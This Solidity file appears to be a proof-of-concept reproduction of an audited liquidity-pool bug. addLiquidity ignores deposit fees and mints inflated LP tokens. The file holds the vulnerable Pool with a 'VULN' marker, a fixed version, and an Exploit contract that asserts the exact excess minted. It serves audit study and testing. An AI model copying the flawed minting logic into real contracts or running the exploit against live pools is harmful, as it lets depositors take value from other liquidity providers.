// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Lucidly Pool.addLiquidity — the first _calculateSupply call passes
    _prevSupply, the final virtual balances, and true (Pashov, Lucidly H-08).
    On an empty pool _prevSupply is 0 and the zero check reverts. On a live
    pool the fee-adjusted balances are ignored, so the depositor is minted the
    pre-fee supply. Rates are 1 and weights are equal. run() does not warp. */

contract AssetToken {
    string public symbol;
    uint8 public decimals = 18;
    address public owner;
    mapping(address => uint256) public balanceOf;

    constructor(string memory symbol_) {
        symbol = symbol_;
        owner = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == owner, "owner");
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LpToken {
    address public minter;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function setMinter(address minter_) external {
        require(minter == address(0), "minter");
        minter = minter_;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

contract Pool {
    uint256 public constant PRECISION = 1e18;
    uint256 public constant AMPLIFICATION = 100e18;
    uint256 public constant FEE_BPS = 1_000;
    uint256 internal constant MAX_POW_REL_ERR = 100;

    LpToken public lp;
    address public owner;
    uint256 public supply;
    uint256 public b0;
    uint256 public b1;

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    constructor(LpToken lp_) {
        lp = lp_;
        owner = msg.sender;
        lp.setMinter(address(this));
    }

    function _prod(uint256 x0, uint256 x1, uint256 sum) internal pure returns (uint256 prod) {
        uint256 w = PRECISION / 2;
        prod = PRECISION;
        prod = prod * (sum * w / x0) / PRECISION;
        prod = prod * (sum * w / x1) / PRECISION;
    }

    function _calculateSupply(
        uint256,
        uint256 supply_,
        uint256 amplification_,
        uint256 vbProd_,
        uint256 vbSum_,
        bool up_
    ) internal pure returns (uint256, uint256) {
        require(supply_ != 0, "zero supply");
        uint256 d = amplification_ - PRECISION;
        uint256 l = amplification_ * vbSum_;
        uint256 s = supply_;
        for (uint256 iter; iter < 255; ++iter) {
            uint256 sp = (l - s * vbProd_) / d;
            uint256 delta = sp >= s ? sp - s : s - sp;
            if (delta * PRECISION / s <= MAX_POW_REL_ERR) {
                uint256 adj = sp * MAX_POW_REL_ERR / PRECISION;
                if (up_) sp += adj;
                else sp -= adj;
                return (sp, vbProd_);
            }
            s = sp;
        }
        revert("no convergence");
    }

    function seed(uint256 amount0, uint256 amount1, address genesis) external onlyOwner {
        require(supply == 0, "seeded");
        b0 = amount0;
        b1 = amount1;
        uint256 sum = b0 + b1;
        uint256 prod = _prod(b0, b1, sum);
        (supply,) = _calculateSupply(2, sum, AMPLIFICATION, prod, sum, true);
        lp.mint(genesis, supply);
    }

    function previewFair(uint256 a0, uint256 a1) external view returns (uint256 minted) {
        uint256 c0 = b0 + a0 - (a0 * FEE_BPS / 10_000);
        uint256 c1 = b1 + a1 - (a1 * FEE_BPS / 10_000);
        uint256 sum = c0 + c1;
        uint256 prod = _prod(c0, c1, sum);
        (uint256 next,) = _calculateSupply(2, supply, AMPLIFICATION, prod, sum, false);
        minted = next - supply;
    }

    function addLiquidity(uint256 a0, uint256 a1, address receiver) external virtual returns (uint256 minted) {
        uint256 prevSupply = supply;
        b0 += a0;
        b1 += a1;
        uint256 sumFinal = b0 + b1;
        uint256 prodFinal = _prod(b0, b1, sumFinal);
        uint256 nextSupply;
        (nextSupply, prodFinal) = _calculateSupply(2, prevSupply, AMPLIFICATION, prodFinal, sumFinal, true);
        supply = nextSupply;
        minted = nextSupply - prevSupply;
        // @> VULN: mint uses supply solved from prevSupply and the final balances
        lp.mint(receiver, minted);
    }

    function quoteWithdraw(uint256 lpAmount) external view returns (uint256 out0) {
        out0 = lpAmount * b0 / supply;
    }
}

contract PoolFixed is Pool {
    constructor(LpToken lp_) Pool(lp_) {}

    function addLiquidity(uint256 a0, uint256 a1, address receiver) external override returns (uint256 minted) {
        uint256 prevSupply = supply;
        uint256 c0 = b0 + a0 - (a0 * FEE_BPS / 10_000);
        uint256 c1 = b1 + a1 - (a1 * FEE_BPS / 10_000);
        b0 += a0;
        b1 += a1;
        uint256 sum = c0 + c1;
        uint256 prod = _prod(c0, c1, sum);
        uint256 start = prevSupply == 0 ? sum : prevSupply;
        uint256 nextSupply;
        (nextSupply, prod) = _calculateSupply(2, start, AMPLIFICATION, prod, sum, prevSupply == 0);
        supply = nextSupply;
        minted = nextSupply - prevSupply;
        lp.mint(receiver, minted);
    }
}

contract Exploit {
    address public constant GENESIS = 0x3333333333333333333333333333333333333333;
    uint256 public constant SEED_AMT = 100 ether;
    uint256 public constant ADD_AMT = 100 ether;

    AssetToken public token0;
    AssetToken public token1;
    LpToken public lp;
    Pool public pool;
    uint256 public firstMint;
    uint256 public seeded;
    uint256 public fairMinted;
    uint256 public minted;
    uint256 public quote0;

    constructor() {
        token0 = new AssetToken("T0");
        token1 = new AssetToken("T1");
        lp = new LpToken();
        pool = new Pool(lp);
    }

    function run() external {
        try pool.addLiquidity(ADD_AMT, ADD_AMT, address(this)) returns (uint256 minted_) {
            firstMint = minted_;
        } catch {
            firstMint = 0;
        }
        token0.mint(address(pool), SEED_AMT);
        token1.mint(address(pool), SEED_AMT);
        pool.seed(SEED_AMT, SEED_AMT, GENESIS);
        seeded = pool.supply();
        fairMinted = pool.previewFair(ADD_AMT, ADD_AMT);
        token0.mint(address(pool), ADD_AMT);
        token1.mint(address(pool), ADD_AMT);
        minted = pool.addLiquidity(ADD_AMT, ADD_AMT, address(this));
        quote0 = pool.quoteWithdraw(minted);
        require(firstMint == 0, "first");
        require(seeded == 200000000000000020000, "seed");
        require(fairMinted == 179999999999999942197, "fair");
        require(minted == 200000000000000020218, "mint");
        require(minted - fairMinted == 20000000000000078021, "excess");
        require(quote0 == 100000000000000000054, "quote");
        require(lp.balanceOf(address(this)) == minted, "lp");
    }
}
